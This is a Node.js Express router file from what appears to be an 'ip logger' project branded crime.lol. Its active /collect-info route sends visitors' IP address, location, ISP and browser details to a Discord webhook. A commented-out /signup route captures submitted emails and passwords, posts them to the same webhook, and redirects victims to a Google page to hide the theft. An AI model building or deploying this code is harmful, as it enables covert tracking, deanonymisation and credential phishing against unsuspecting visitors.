const express = require('express')
const router = express.Router()
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const axios = require("axios")

if (!process.env.WEBHOOK_URI) {
  console.log("Error: No WEBHOOK_URI detected in .env")
}

const hook = new Webhook(process.env.WEBHOOK_URI);

const d = new Date();
let date = d.toDateString();

router.get("/", (req, res, next) => {
  res.render('index')
});

router.post("/collect-info", async (req, res) => {
  const data = req.body
  const embedData = {
    embeds: [
        {
            title: "<:crime10:1265004490554212464> crime.lol | ip logger",
            url: "https://crime.lol",
            author: {
                name: "maxwalks",
                url: "https://github.com/maxwalks/nodejs-ip-grabber",
                icon_url: "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&"
            },
            thumbnail: {
                url: "https://files.catbox.moe/udd67s.png"
            },
            image: {
                url: "https://files.catbox.moe/lpsllj.png"
            },
            fields: [
                { name: "IP Address", value: `${data.ipInfo.YourFuckingIPAddress}` },
                { name: "Country", value: `${data.detailedInfo.country}`},
                { name: "Region", value: `${data.detailedInfo.regionName}`},
                { name: "Full Location", value: `${data.ipInfo.YourFuckingLocation}`},
                { name: "Timezone", value: `${data.detailedInfo.timezone}`},
                { name: "ISP", value: `${data.detailedInfo.org}`},
                { name: "Organization", value: `${data.detailedInfo.org}`},
                { name: "Autonomous System", value: `${data.detailedInfo.as}`},
                { name: "Browser Name", value: `${data.browserInfo.name}`},
                { name: "Platform Name", value: `${data.browserInfo.name}`},
                { name: "Mobile/Tablet", value: `${data.browserInfo.isMobile || data.browserInfo.isTablet ? 'Yes': "No"}`}
            ],
            footer: {
                text: "crime.lol"
            },
            timestamp: new Date(),
            color: 0x318e90
        }
    ]
};
const discordWebhookUrl = process.env.WEBHOOK_URI
try {
    const response = await axios.post(discordWebhookUrl, embedData, {
        headers: {
            'Content-Type': 'application/json'
        }
    });

    if (response.status !== 204) {
        throw new Error('Failed to send embed');
    }

    res.status(200).send('Embed sent successfully!');
} catch (error) {
    console.error('Error sending embed:', error);
    res.status(500).send('Failed to send embed');
}
})

router.get('/error', (req, res) => {
  res.status(500).json({ error: "No ip address detected, server is likely running in localhost. Please use a proxy." })
  hook.send("No ip address detected, server is likely running in localhost. Please use a proxy.")
})
// router.post('/signup', (req, res, next) => {
//   try {
//     const ip = req.headers["x-forwarded-for"]
//     const { email, password } = req.body
//     if(!ip) {
//       const embed1 = new MessageBuilder()
//         .setTitle("NodeJS ip logger")
//         .setDescription("New signup info!")
//         .setAuthor(
//           "maxwalks",
//           "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&",
//           "https://github.com/maxwalks/nodejs-ip-grabber"
//         )
//         .setURL("https://github.com/maxwalks/nodejs-ip-grabber")
//         .addField("Hostname", `${req.hostname}`)
//         .addField("Headers", `${req.headers["user-agent"]}`)
//         .addField("Email", `${email}`)
//         .addField("Password", `${password}`)
//         .addField("Request", `**${req.method}** ${req.url}`)
//         .setColor(7785669)
//         .setFooter(
//           "Made by maxwalks",
//           "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&"
//         )
//         .setTimestamp();
//         hook.send(embed1)
//         res.redirect("https://www.google.com/account/about/")
//     } else {
//       const SplitIp = ip.split(",")[0];
//       const embed = new MessageBuilder()
//         .setTitle("NodeJS ip logger")
//         .setAuthor(
//           "maxwalks",
//           "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&",
//           "https://github.com/maxwalks/nodejs-ip-grabber"
//         )
//         .setURL("https://github.com/maxwalks/nodejs-ip-grabber")
//         .addField("Hostname", `${req.hostname}`)
//         .addField("Headers", `${req.headers["user-agent"]}`)
//         .addField("IP address", `${SplitIp}`, true)
//         .addField("Email", `${email}`)
//         .addField("Password", `${password}`)
//         .addField("Request", `**${req.method}** ${req.url}`)
//         .setColor(7785669)
//         .setDescription(
//           "New signup info!"
//         )
//         .setFooter(
//           "Made by maxwalks",
//           "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&"
//         )
//         .setTimestamp();
//       hook.send(embed)
//       res.redirect('https://www.google.com/account/about/')
//     }
//   } catch (error) {
//     next(error)
//   }
// })

module.exports = router;